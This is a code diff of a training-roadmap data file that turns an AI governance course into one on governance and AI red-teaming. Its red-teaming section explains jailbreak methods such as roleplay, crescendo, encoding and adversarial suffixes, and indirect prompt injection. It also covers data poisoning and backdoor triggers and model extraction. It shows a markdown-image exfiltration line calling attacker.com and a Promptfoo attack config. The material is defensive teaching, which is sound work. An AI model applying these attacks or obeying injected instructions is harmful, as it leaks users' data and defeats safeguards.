@@ -3,279 +3,270 @@ import { S } from "../shared";
 
 export const aiGovernanceSpecialist: Roadmap = {
   slug: "ai-governance-compliance-specialist",
-  title: "AI Governance & Compliance Specialist",
+  title: "AI Governance, Risk & Red-Teaming Specialist",
   emoji: "⚖️",
   description:
-    "Set up the policies, risk assessments, documentation and oversight that keep AI use lawful, safe, fair and accountable.",
+    "Architect enterprise AI governance, statutory compliance, and adversarial security assurance—combining the canonical roadmap.sh AI Red Teaming curriculum (OWASP LLM Top 10, prompt injection, jailbreaking, model extraction, data poisoning, Garak/PyRIT) with the EU AI Act, NIST AI RMF, and ISO/IEC 42001.",
   audience:
-    "Risk, legal, audit, privacy and security professionals, and technologists moving into responsible-AI roles.",
-  tools: ["AI inventory / register", "Risk and impact assessments", "Model cards", "Policy templates", "Audit evidence trackers", "Bias testing reports"],
+    "AI security engineers, red-teamers, GRC/risk architects, privacy/legal counsel, and technical leads responsible for lawful, secure, and auditable AI systems.",
+  tools: [
+    "NIST AI RMF, ISO/IEC 42001 & EU AI Act Annexes",
+    "OWASP Top 10 for LLMs & MITRE ATLAS",
+    "Garak, Microsoft PyRIT, Promptfoo & Inspect AI",
+    "NeMo Guardrails, Llama Guard & Presidio PII",
+    "SHAP / Fairlearn Bias Auditing & Model Cards",
+    "Enterprise AI Inventory & AIIA / DPIA Registers",
+  ],
   outcomes: [
-    "Explain the main AI laws and frameworks and map them to a real product.",
-    "Run risk and impact assessments and set up policy and oversight.",
-    "Collect evidence, audit controls and handle incidents.",
+    "Classify AI systems under the EU AI Act, NIST AI RMF (Govern, Map, Measure, Manage), ISO/IEC 42001, and sectoral regulations (SR 11-7, GDPR/DPDP).",
+    "Execute systematic AI Red Teaming across direct/indirect prompt injection, multi-turn jailbreaks, data poisoning, and model extraction using Garak, PyRIT, and Promptfoo.",
+    "Operate an enterprise AI governance programme: shadow-AI inventory, algorithmic impact assessments, fairness/bias audits, vendor due diligence, and incident response.",
   ],
   sections: [
     {
-      id: "ai-basics",
-      title: "AI basics for governance",
+      id: "lifecycle-threat-landscape",
+      title: "1. AI Lifecycle Risk & Adversarial Threat Taxonomy",
       topics: [
         S.mlFundamentals,
         S.transformersLlms,
         {
           id: "lifecycle-risk",
-          title: "Risks across the AI lifecycle",
-          minutes: 7,
-          summary: "Where things go wrong from idea to retirement.",
-          body: [
-            "Risk appears at every stage. In planning: an unsuitable use or unclear purpose. In data: poor quality, bias, missing consent or copyright problems. In development: weak testing or opaque models. In deployment: misuse, security flaws and over-reliance. In operation: drift, silent degradation and changing laws. At retirement: leftover data and models.",
-            "Learn to ask engineers precise questions at each stage: what data, which model, what testing, who approves, how is it monitored. Controls work best when attached to the lifecycle, such as a mandatory review before launch.",
-          ],
-          points: [
-            "Risks arise from planning through retirement.",
-            "Ask stage-specific questions about data, models, testing and monitoring.",
-            "Attach controls to lifecycle gates such as pre-launch review.",
-          ],
-        },
-      ],
-    },
-    {
-      id: "ethics",
-      title: "Ethics, fairness and transparency",
-      topics: [
-        S.responsibleAi,
-        {
-          id: "fairness-testing",
-          title: "Fairness and bias testing",
+          title: "Risks Across the AI Lifecycle & MITRE ATLAS / OWASP LLM Top 10",
           minutes: 8,
-          summary: "Measure differences between groups and decide what is acceptable.",
+          summary: "Map failure modes from training data curation through post-deployment drift using OWASP Top 10 for LLMs and MITRE ATLAS.",
           body: [
-            "Bias can enter through unrepresentative data, biased labels or the way a problem is framed. Test by comparing error rates, approval rates or outcomes across groups, for example by gender, age or region where lawful and appropriate. Several fairness definitions exist and they can conflict, so the choice is a policy decision, not only a technical one.",
-            "Document what was tested, the results and the decision taken. Mitigation can include better data, threshold adjustment, human review or not using AI for that case. Repeat testing after changes and in production.",
+            "AI risk spans every phase of the system lifecycle: **Design** (prohibited or unvalidated use cases), **Data Curation** (copyright infringement, PII leakage, biased representation, data poisoning), **Training & Adaptation** (reward hacking, backdoor triggers, unverified open-weight pickle files), **Deployment** (prompt injection, excessive agency, broken access controls), and **Operations** (silent distributional drift, automation bias).",
+            "Anchor your threat modeling in two industry taxonomies: the **OWASP Top 10 for LLM & GenAI Applications** (Prompt Injection, Sensitive Information Disclosure, Supply Chain, Data/Model Poisoning, Improper Output Handling, Excessive Agency, System Prompt Leakage, Vector/Embedding Weaknesses, Misinformation, Unbounded Consumption) and **MITRE ATLAS** (Adversarial Threat Landscape for Artificial-Intelligence Systems).",
           ],
           points: [
-            "Compare outcomes and error rates across groups.",
-            "Fairness definitions can conflict; record the policy choice.",
-            "Retest after changes and in production.",
-          ],
-        },
-        {
-          id: "explainability",
-          title: "Explainability and human oversight",
-          minutes: 7,
-          summary: "Give people understandable reasons and real ability to intervene.",
-          body: [
-            "Explainability ranges from inherently interpretable models, such as simple rules and linear models, to after-the-fact tools that show which inputs influenced a prediction. Choose the level needed by the decision's impact: a loan refusal needs clearer reasons than a movie suggestion. Explanations can be misleading, so validate them.",
-            "Human oversight must be real. The reviewer needs enough information, time, authority and training to disagree with the system. Guard against automation bias, where people accept machine suggestions without checking.",
-          ],
-          points: [
-            "Match explanation depth to decision impact.",
-            "Explanations need validation.",
-            "Oversight requires information, time, authority and training.",
-          ],
-        },
-        {
-          id: "transparency-documentation",
-          title: "Model cards and documentation",
-          minutes: 6,
-          summary: "Record purpose, data, performance, limits and owners.",
-          body: [
-            "A model card summarises what a model is for, who made it, the data used, how it was evaluated, known limits and appropriate uses. Datasheets describe datasets in a similar way, and system cards cover a full product including safeguards. Keep them current and version-controlled.",
-            "Good documentation supports audits, customer questions and regulation. Make it easy to produce by collecting facts during development, rather than writing it afterwards from memory.",
-          ],
-          points: [
-            "Model cards: purpose, data, evaluation, limits, owners.",
-            "Datasheets describe datasets; system cards describe products.",
-            "Collect documentation during development.",
+            "Use OWASP Top 10 for LLMs for application-layer threats and MITRE ATLAS for adversarial ML attack tactics.",
+            "Attach mandatory governance review gates to lifecycle transitions (Data Sign-off, Pre-Launch Red Team, Production Drift Audit).",
+            "Distinguish deterministic software vulnerabilities from probabilistic model behavior risks.",
           ],
         },
       ],
     },
     {
-      id: "law",
-      title: "Laws, frameworks and standards",
+      id: "laws-regulations-standards",
+      title: "2. Global AI Regulation, NIST AI RMF & ISO/IEC 42001",
       topics: [
-        S.aiRegulation,
         {
           id: "eu-ai-act",
-          title: "The EU AI Act",
+          title: "The EU AI Act: Risk Tiers, High-Risk Obligations & GPAI Rules",
           minutes: 9,
-          summary: "A risk-based law with obligations that depend on your role.",
+          summary: "Classify systems across Prohibited, High-Risk (Annex III), Transparency, Minimal-Risk, and General-Purpose AI (GPAI) tiers.",
           body: [
-            "The EU AI Act sorts AI into categories: prohibited practices, high-risk systems, systems with transparency duties (such as chatbots and synthetic media) and minimal-risk systems. It also has rules for general-purpose AI models. High-risk systems, for example in hiring, credit, education and critical infrastructure, must meet requirements on risk management, data quality, documentation, logging, human oversight, accuracy and security.",
-            "Obligations depend on your role: provider, deployer, importer or distributor. The law applies in phases and guidance keeps evolving, and it can reach non-EU companies whose systems are used in the EU. Check current official texts and dates, and take legal advice for a real product.",
+            "The **EU AI Act** establishes binding, extraterritorial regulation structured by risk tier: (1) **Unacceptable / Prohibited Practices** (Article 5: social scoring, manipulative subliminal AI, untargeted facial scraping, emotion recognition in workplaces/schools); (2) **High-Risk AI Systems** (Annex III: biometrics, critical infrastructure, education, employment/hiring, credit scoring/insurance, law enforcement, migration, justice); (3) **Limited / Transparency Risk** (Article 50: chatbots, deepfakes, emotion/biometric categorization must disclose AI nature); and (4) **Minimal Risk**.",
+            "High-Risk **Providers** must maintain a continuous Risk Management System, data governance, Annex IV Technical Documentation, automatic logging, instructions for use, human oversight design, robustness/cybersecurity, and EU database registration. **Deployers** must conduct Fundamental Rights Impact Assessments (FRIAs), ensure qualified human oversight, monitor operation, and inform affected workers/consumers. Separate rules govern **General-Purpose AI (GPAI)** models and systemic-risk frontier models ($>10^{25}$ FLOPs).",
           ],
           points: [
-            "Categories: prohibited, high-risk, transparency, minimal; plus general-purpose models.",
-            "High-risk systems need risk management, documentation, logging and human oversight.",
-            "Your role (provider or deployer) decides your duties; verify current dates.",
+            "Determine first whether your organization acts as a **Provider** (develops or substantially modifies) or **Deployer** (uses under its authority)—modifying a GPAI model for a High-Risk purpose can make a deployer a legal Provider.",
+            "High-Risk Annex III systems (HR recruitment, creditworthiness, healthcare triage) require Annex IV technical dossiers, logging, and conformity assessment.",
+            "Extraterritorial scope applies whenever an AI system's output is used within the European Union.",
           ],
         },
         {
           id: "nist-rmf",
-          title: "NIST AI Risk Management Framework",
-          minutes: 7,
-          summary: "Govern, Map, Measure, Manage.",
+          title: "NIST AI Risk Management Framework (AI RMF 1.0 & GenAI Profile) & ISO/IEC 42001",
+          minutes: 8,
+          summary: "Operationalize Govern, Map, Measure, Manage alongside certifiable ISO/IEC 42001 AI Management Systems (AIMS).",
           body: [
-            "The NIST AI RMF is voluntary guidance organised into four functions. Govern builds culture, policies and accountability. Map frames context, purpose and potential impacts. Measure assesses and tracks risks with tests and metrics. Manage prioritises and treats risks and plans responses. A companion profile covers generative AI.",
-            "Use it as a common language with engineers and executives: for each system, map context and risks, measure them, manage them and govern the whole process. It pairs well with a management-system standard such as ISO/IEC 42001.",
+            "The **NIST AI RMF 1.0** (and NIST AI 600-1 Generative AI Profile) organizes risk management into four continuous functions: **GOVERN** (organizational policies, risk appetite, RACI accountability, inventory), **MAP** (context, intended purpose, stakeholder impact, third-party dependencies), **MEASURE** (quantitative TEVV—Testing, Evaluation, Verification, and Validation for accuracy, fairness, privacy, and red-teaming), and **MANAGE** (risk treatment, incident response, fallbacks, decommissioning).",
+            "**ISO/IEC 42001** is the international certifiable standard for an **AI Management System (AIMS)** (structured like ISO 27001 with Clauses 4–10 and Annex A controls covering AI policies, internal audit, impact assessments, data quality, and supplier oversight).",
           ],
           points: [
-            "Four functions: Govern, Map, Measure, Manage.",
-            "Voluntary but widely used as a shared vocabulary.",
-            "Pairs with ISO/IEC 42001 for a management system.",
-          ],
-        },
-        {
-          id: "iso-42001",
-          title: "ISO/IEC 42001 and management systems",
-          minutes: 6,
-          summary: "A certifiable management system for AI.",
-          body: [
-            "ISO/IEC 42001 specifies requirements for an AI management system (AIMS) in an organisation: scope, leadership, policy, risk assessment, controls, monitoring, internal audit and continual improvement. Organisations can be certified by an accredited body, which helps show customers a structured approach.",
-            "It follows the same structure as other ISO management standards, so teams already running information-security or quality systems can integrate it. A certificate shows a system exists; it does not prove each AI product is safe or lawful.",
-          ],
-          points: [
-            "Defines an AI management system with continual improvement.",
-            "Certifiable by an accredited body.",
-            "Certification is not proof of any single product's compliance.",
+            "Use NIST AI RMF (Govern, Map, Measure, Manage) as your engineering-to-boardroom risk vocabulary.",
+            "Align enterprise governance controls with ISO/IEC 42001 Annex A so external certification audits reuse existing ISO 27001 evidence.",
+            "Require quantitative TEVV (Testing, Evaluation, Verification & Validation) artifacts before any Manage sign-off.",
           ],
         },
         S.dataPrivacy,
         {
-          id: "ip-copyright",
-          title: "Intellectual property and copyright",
-          minutes: 6,
-          summary: "Training data, outputs and licences.",
-          body: [
-            "Key questions: was the training data collected lawfully and under suitable licences? Who owns generated output, and can it infringe someone's work? Can staff paste confidential material into a public tool? Rules differ by country and are still being tested in courts.",
-            "Practical controls include approved-tool lists, rules for confidential and customer data, review of vendor terms on training and indemnities, keeping records of data sources and licences, and human review of generated content before publication.",
-          ],
-          points: [
-            "Check training-data rights and output ownership terms.",
-            "Restrict confidential data in public tools.",
-            "Record data sources and licences; review vendor indemnities.",
-          ],
-        },
-        {
           id: "sector-rules",
-          title: "Sector-specific rules",
-          minutes: 6,
-          summary: "Finance, health, employment and public-sector requirements.",
+          title: "Sectoral Regulations (Finance SR 11-7, Healthcare FDA/HIPAA, Employment) & Copyright/IP",
+          minutes: 7,
+          summary: "Navigate banking model risk management (SR 11-7), fair lending (ECOA), NYC Local Law 144 hiring audits, and training/output IP law.",
           body: [
-            "Many industries already have rules that apply to AI: model risk management and fair-lending rules in finance, safety and clinical validation in health, anti-discrimination law in hiring, and procurement and transparency rules in government. Regulators in several countries have issued guidance on using AI in their sector.",
-            "Build a register of obligations by sector and country for each product, name an owner for each, and check it regularly. Work with legal counsel and domain experts, because the details are specialised and change over time.",
+            "Long before horizontal AI laws existed, sectoral regulators enforced strict rules on automated decision systems: in **Banking & Finance**, US Federal Reserve **SR 11-7** mandates independent model validation, conceptual soundness review, ongoing monitoring, and adverse-action reason codes under **ECOA / Fair Lending**; in **Employment**, NYC Local Law 144 and EEOC guidance require independent bias audits of Automated Employment Decision Tools (AEDTs); in **Healthcare**, FDA SaMD (Software as a Medical Device) PCCPs and HIPAA govern clinical models.",
+            "Simultaneously, manage **Intellectual Property & Copyright**: audit training dataset provenance, prohibit pasting confidential trade secrets into consumer AI tools, and review commercial vendor IP indemnification clauses.",
           ],
           points: [
-            "Existing sector rules already apply to AI.",
-            "Maintain an obligations register with owners.",
-            "Involve legal and domain experts.",
+            "In financial services, treat LLMs and ML models under SR 11-7 Model Risk Management with independent second-line validation.",
+            "Adverse credit, insurance, or hiring decisions require specific, auditable reason codes—opaque black-box denials violate law.",
+            "Maintain a jurisdictional & sectoral obligations register mapped to each product's geography and industry.",
           ],
         },
       ],
     },
     {
-      id: "programme",
-      title: "Building the governance programme",
+      id: "ai-red-teaming",
+      title: "3. AI Red Teaming: Prompt Injection, Jailbreaks & Model Attacks",
+      topics: [
+        {
+          id: "red-teaming-prompt-injection",
+          title: "Prompt Hacking: Direct & Indirect Prompt Injection, Jailbreaks & System Leakage",
+          minutes: 9,
+          summary: "Execute and defend against direct jailbreaks, indirect prompt injections across RAG/MCP tools, and ASCII/multilingual encoding bypasses.",
+          body: [
+            "Because LLMs process system instructions and untrusted user/external data inside the same token stream, they lack hardware-level separation between code and data. **Direct Prompt Injection & Jailbreaking** uses roleplay personas, hypothetical framing, multi-turn crescendo escalation, base64/hex/cipher encoding, low-resource languages, or adversarial suffixes (GCG) to bypass safety training or extract confidential system prompts.",
+            "**Indirect Prompt Injection** embeds malicious instructions inside external data retrieved by the model—emails, PDFs, web pages, calendar invites, or database rows. When an agent ingests the poisoned document, it can be hijacked into calling tools or exfiltrating sensitive context via markdown image URLs or webhook calls.",
+          ],
+          points: [
+            "Never rely on system prompt wording alone to protect secrets or enforce permissions.",
+            "Test multi-turn Crescendo jailbreaks, payload splitting, and indirect injections embedded in retrieved RAG documents.",
+            "Block markdown image rendering (`![exfil](https://attacker.com/?q=...)`) and restrict outbound network egress to prevent silent data exfiltration.",
+          ],
+        },
+        {
+          id: "adversarial-ml-attacks",
+          title: "Model Vulnerabilities: Data Poisoning, Backdoors, Model Extraction & Privacy Attacks",
+          minutes: 8,
+          summary: "Assess training data poisoning, sleeper backdoor triggers, API weight distillation/extraction, and membership inference.",
+          body: [
+            "Beyond prompt-level attacks, adversaries target the model weights and training pipeline directly: **Data Poisoning & Backdoor Attacks** inject a small number of crafted training or preference examples (<0.5% of fine-tuning data) so the model behaves normally on standard inputs but triggers malicious output when a specific phrase appears.",
+            "**Model Extraction (Stealing)** queries a proprietary API systematically to distill a clone model at a fraction of training cost; **Membership Inference** and **Model Inversion** probe output probabilities/logits to determine whether a specific person's record was in the training set or reconstruct memorized PII.",
+          ],
+          points: [
+            "Scan fine-tuning datasets and open-weight adapters on Hugging Face for poisoning anomalies and unsafe pickle serialization.",
+            "Mitigate model extraction by rate-limiting API queries, stripping full log-probability vectors on sensitive endpoints, and watermarking.",
+            "Prevent PII memorization via pre-training deduplication, Presidio PII scrubbing, and Differential Privacy (DP-SGD) where required.",
+          ],
+        },
+        {
+          id: "red-teaming-tools-ops",
+          title: "Automated Red-Teaming Operations: Garak, Microsoft PyRIT & Promptfoo",
+          minutes: 8,
+          summary: "Run repeatable black-box and grey-box red-team campaigns in CI/CD using Garak, PyRIT, Promptfoo, and Inspect AI.",
+          body: [
+            "Manual ad-hoc red-teaming does not scale across weekly model and prompt releases. Build an automated red-teaming harness using open-source assurance frameworks: **NVIDIA Garak** (an LLM vulnerability scanner probing dozens of injection, hallucination, toxicity, and leakage vectors), **Microsoft PyRIT** (Python Risk Identification Tool for multi-turn automated attacker-target orchestration), and **Promptfoo** (declarative YAML red-team suites integrated into GitHub Actions).",
+            "Score attack runs using Attack Success Rate (ASR) broken down by threat category, document reproducible proof-of-concept transcripts, and verify that layered input/output guardrails (Llama Guard, NeMo Guardrails, Lakera) block the exploit without causing excessive false-positive refusals on benign queries.",
+          ],
+          points: [
+            "Track **Attack Success Rate (ASR)** alongside **False Refusal Rate (FRR)** so safety guardrails do not break legitimate user workflows.",
+            "Use Microsoft PyRIT or Promptfoo to run automated multi-turn attacker LLMs against your target application before every major release.",
+            "Maintain a regression suite of all historical successful jailbreaks and indirect injections.",
+          ],
+          example: {
+            title: "Declarative Promptfoo red-team configuration testing injection and PII leakage",
+            language: "yaml",
+            code: `description: "Enterprise Support Agent Red-Team Suite"
+targets:
+  - id: "https://api.internal.example/v1/chat"
+redteam:
+  purpose: "Customer support assistant with read access to order status"
+  plugins:
+    - prompt-injection
+    - indirect-prompt-injection
+    - pii:direct
+    - rbac
+    - harmful:privacy
+  strategies:
+    - jailbreak
+    - crescendo
+    - base64`,
+          },
+        },
+      ],
+    },
+    {
+      id: "fairness-explainability-cards",
+      title: "4. Fairness Auditing, Explainability & Transparency Documentation",
+      topics: [
+        {
+          id: "fairness-testing",
+          title: "Algorithmic Fairness Auditing, Disaggregated Metrics & Bias Mitigation",
+          minutes: 8,
+          summary: "Measure Demographic Parity, Equalized Odds, Disparate Impact (Four-Fifths Rule), and subgroup calibration with Fairlearn.",
+          body: [
+            "Aggregate accuracy hides severe harm against underrepresented cohorts. Fairness auditing evaluates disaggregated metrics across protected attributes (gender, race/ethnicity, age, geography, disability): **Demographic Parity / Disparate Impact Ratio** ($P(\\hat{Y}=1 | A=a) / P(\\hat{Y}=1 | A=b) \\ge 0.80$, the EEOC four-fifths rule), **Equal Opportunity** (equal True Positive Rates across groups), **Equalized Odds** (equal TPR and FPR), and **Predictive Parity** (equal Precision/calibration across groups).",
+            "Because mathematical impossibility theorems prove that Equalized Odds and Predictive Parity cannot be satisfied simultaneously when base rates differ across groups, selecting the right fairness criterion is a documented legal and ethical policy decision—not a pure math toggle.",
+          ],
+          points: [
+            "Compute disaggregated confusion matrices and error rates across demographic and intersectional slices using `Fairlearn` or `AIF360`.",
+            "Document the chosen fairness metric and rationale with legal and business stakeholders, as mathematical criteria trade off against one another.",
+            "Apply pre-processing (reweighting), in-processing (fairness constraints), or post-processing (group threshold optimization) when bias exceeds tolerances.",
+          ],
+        },
+        {
+          id: "explainability",
+          title: "Explainable AI (SHAP, Counterfactuals) & Meaningful Human Oversight",
+          minutes: 7,
+          summary: "Provide verifiable global and local explanations and design human-in-the-loop oversight that prevents automation bias.",
+          body: [
+            "High-stakes decisions require two levels of explainability: **Global Explainability** (how the model behaves overall across features via permutation importance and SHAP summary plots) and **Local / Counterfactual Explainability** (why a specific applicant was denied and the smallest change required to flip the outcome).",
+            "Under EU AI Act Article 14, human oversight must be meaningful, not a rubber stamp: operators need clear confidence indicators, provenance citations, training on model failure modes, sufficient time per case, and explicit authority to override or shut down the system without penalty.",
+          ],
+          points: [
+            "Use TreeSHAP / KernelSHAP or counterfactual explanations to generate auditable adverse-action reason codes.",
+            "Combat **Automation Bias** (operators blindly clicking Approve) by measuring human override rates and injecting periodic calibration cases.",
+            "Never use an unvalidated post-hoc LLM rationalization as a substitute for true feature attribution.",
+          ],
+        },
+        {
+          id: "transparency-documentation",
+          title: "Model Cards, System Cards, Datasheets for Datasets & Annex IV Dossiers",
+          minutes: 6,
+          summary: "Standardize technical transparency artifacts across datasets, models, and deployed AI systems.",
+          body: [
+            "Standardize three living documentation artifacts in version control: (1) **Datasheets for Datasets** (Gebru et al.)—recording collection methodology, consent/licensing, demographic composition, preprocessing, and retention; (2) **Model Cards** (Mitchell et al.)—recording intended use, out-of-scope uses, architecture, training/eval data, disaggregated subgroup performance, and ethical limitations; and (3) **System Cards & EU AI Act Annex IV Technical Documentation**—covering the end-to-end application, guardrails, human oversight, logging, and post-market monitoring plan.",
+          ],
+          points: [
+            "Auto-generate performance and fairness sections of Model Cards directly from CI evaluation pipelines so documentation never drifts.",
+            "Explicitly list **Out-of-Scope / Prohibited Uses** on every internal and external Model Card.",
+            "Map documentation fields directly to EU AI Act Annex IV and ISO/IEC 42001 clauses to eliminate duplicate compliance work.",
+          ],
+        },
+      ],
+    },
+    {
+      id: "enterprise-governance-programme",
+      title: "5. Enterprise Governance Programme, Vendor Risk & Incident Response",
       topics: [
         {
           id: "ai-policy",
-          title: "AI policy, inventory and roles",
+          title: "Enterprise AI Inventory, Shadow AI Discovery, Policy & Tiered Intake",
           minutes: 7,
-          summary: "Decide what is allowed, who decides and what is deployed.",
+          summary: "Build a central AI System Register, govern employee Shadow AI usage, and run a risk-tiered intake workflow.",
           body: [
-            "Start with an inventory of every AI system and tool in use, including shadow use by employees. Write a clear acceptable-use policy: approved tools, forbidden uses, rules for data and requirements for human review. Define roles with a RACI chart: who owns, who reviews, who approves, who is informed.",
-            "Create an intake process so every new AI use case gets a proportionate review. Low-risk uses should move quickly, high-risk ones deserve committee review. Train staff, because policy without awareness fails.",
+            "You cannot govern what you do not know exists. Establish a central **Enterprise AI Register** capturing every internal model, customer-facing AI feature, and third-party SaaS tool with embedded AI (discovering 'Shadow AI' via CASB/SSO logs and procurement hooks).",
+            "Publish a clear **Acceptable Use Policy (AUP)** and **RACI Matrix** across Product, Engineering, Security, Privacy, Legal, and Risk. Route new initiatives through a fast **Tiered Intake Triage**: Minimal-Risk internal productivity tools clear automated self-attestation in 24 hours, whereas High-Risk or customer-PII systems trigger formal review by the AI Governance Committee.",
           ],
           points: [
-            "Inventory all AI use, including shadow tools.",
-            "Define policy, roles and a RACI.",
-            "Use a proportionate intake and review process.",
+            "Pair a fast low-friction green lane for low-risk internal use cases with rigorous gating for high-risk customer-facing systems.",
+            "Integrate AI intake directly into Jira/ServiceNow architecture review and procurement workflows.",
+            "Provide sanctioned, zero-data-retention enterprise LLM workspaces so employees have no incentive to paste secrets into consumer chatbots.",
           ],
         },
         {
           id: "risk-assessment",
-          title: "AI risk and impact assessments",
+          title: "Algorithmic Impact Assessments (AIIA), DPIAs & Vendor Due Diligence",
           minutes: 8,
-          summary: "Identify harms, rate them and decide on controls.",
+          summary: "Execute combined AI Impact & Data Protection Impact Assessments and vet third-party AI vendors under contract.",
           body: [
-            "An assessment describes the system and purpose, the people affected, the data used, possible harms (safety, discrimination, privacy, security, reputation, legal), their likelihood and severity, existing controls and the remaining risk. Include a data protection impact assessment when personal data is processed at risk.",
-            "Decide: accept, reduce, transfer or avoid, and record who approved the residual risk. Reassess when the system, data or context changes. Keep the output short and usable, not a document nobody reads.",
+            "For medium- and high-risk systems, conduct a structured **AI Impact Assessment (AIIA)** combined with a GDPR/DPDP **Data Protection Impact Assessment (DPIA)** and EU AI Act **Fundamental Rights Impact Assessment (FRIA)**: document affected populations, severity and likelihood of potential harms, pre-mitigation risk score, technical/operational controls, residual risk sign-off, and re-assessment triggers.",
+            "When procuring third-party AI vendors or foundation model APIs, execute **AI Vendor Due Diligence**: verify zero-data-retention (ZDR) and non-training contractual clauses, SOC 2 Type II / ISO 27001 / ISO 42001 attestations, subprocessor chains, red-team evaluation reports, IP indemnification, and model deprecation SLAs.",
           ],
           points: [
-            "Rate harms by likelihood and severity.",
-            "Record controls, residual risk and the approver.",
-            "Reassess after material changes.",
+            "Combine AIIA, DPIA, and InfoSec questionnaires into a single unified intake workflow to prevent assessment fatigue.",
+            "Require contractual guarantees that customer prompts and outputs are never used to train vendor foundation models.",
+            "Mandate 90-day advance notice and fallback support before vendors deprecate pinned model checkpoints.",
           ],
         },
-        {
-          id: "vendor-risk",
-          title: "Third-party and vendor risk",
-          minutes: 6,
-          summary: "Due diligence for AI products and model providers.",
-          body: [
-            "Ask vendors about data handling (storage, retention, use for training), security certifications, model evaluation, incident history, subprocessors, uptime, change notification and how they support your legal duties. Request documentation such as model cards and audit reports.",
-            "Put protections in contracts: confidentiality, data location, breach notice, audit rights, liability and exit terms. Monitor vendors after signing, since models and policies change.",
-          ],
-          points: [
-            "Ask about data use, security, testing and subprocessors.",
-            "Contract for breach notice, audit rights and exit.",
-            "Keep monitoring after onboarding.",
-          ],
-        },
-        S.guardrailsSecurity,
-      ],
-    },
-    {
-      id: "assurance",
-      title: "Assurance and response",
-      topics: [
         {
           id: "incident-response",
-          title: "AI incident response",
-          minutes: 6,
-          summary: "Detect, contain, report and learn from AI failures.",
-          body: [
-            "AI incidents include harmful or biased outputs, data leaks, security attacks, wrong automated decisions and unexpected model behaviour after an update. Define what counts as an incident, how people report it, severity levels, who can pause a system, and when to notify customers, regulators or affected people.",
-            "After containment, find the root cause, fix it, test the fix and record lessons. Keep a log of incidents and near-misses. Some laws set reporting deadlines, so know those in advance.",
-          ],
-          points: [
-            "Define incident types, severity and the authority to pause systems.",
-            "Know notification duties and deadlines.",
-            "Run a root-cause review and keep an incident log.",
-          ],
-        },
-        {
-          id: "audit-assurance",
-          title: "Audit, evidence and assurance",
+          title: "AI Incident Response, Kill Switches, Continuous Audit & Board Reporting",
           minutes: 7,
-          summary: "Prove that controls exist and work.",
+          summary: "Run AI incident response playbooks, meet regulatory reporting deadlines, and automate continuous audit evidence.",
           body: [
-            "Auditors ask for evidence: policies, approvals, assessments, test results, monitoring records and training logs. Define controls clearly, name owners and collect evidence continuously so audits are routine. Test that controls operate, not just that they exist on paper.",
-            "Three lines of defence is a common model: teams own risk, a governance function oversees it and independent audit assures it. Use internal audit findings to improve, and track actions to closure.",
+            "Define an **AI Incident Response Plan** integrated with your SOC/CSIRT runbooks covering jailbreak exploits, cross-tenant data leakage, discriminatory output spikes, and hallucinated legal/financial commitments. Ensure every production AI system has an immediate **Kill Switch / Circuit Breaker** that reverts to a deterministic workflow or human queue within 60 seconds.",
+            "Note statutory reporting timelines: GDPR data breaches require supervisory notification within **72 hours**, and the EU AI Act mandates reporting serious high-risk incidents to market surveillance authorities (within 2–15 days depending on severity). Collect continuous audit evidence across the Three Lines of Defence and report risk KPIs to the Board quarterly.",
           ],
           points: [
-            "Collect evidence continuously, not only before audits.",
-            "Test that controls actually operate.",
-            "Track findings to closure.",
+            "Verify that every production AI feature has a tested kill switch that can disable model calls without taking down the host application.",
+            "Align incident severity definitions with GDPR (72-hour breach window) and EU AI Act Article 73 serious-incident reporting deadlines.",
+            "Automate continuous control evidence collection (eval logs, sign-offs, drift reports) so internal and external audits are always audit-ready.",
           ],
         },
-        {
-          id: "governance-metrics",
-          title: "Metrics and reporting",
-          minutes: 5,
-          summary: "Tell leaders how well AI risk is managed.",
-          body: [
-            "Useful indicators include the number of AI systems by risk level, share with completed assessments, open high risks, incident counts and time to resolve, training completion and vendor reviews overdue. Combine numbers with short narratives about emerging issues.",
-            "Report regularly to senior leaders and the board in plain language, with clear decisions requested. Metrics should drive action, not decorate slides.",
-          ],
-          points: [
-            "Track coverage, open risks, incidents and training.",
-            "Add short narratives to numbers.",
-            "Ask for decisions in every report.",
-          ],
-        },
-        S.stakeholderComm,
       ],
     },
   ],
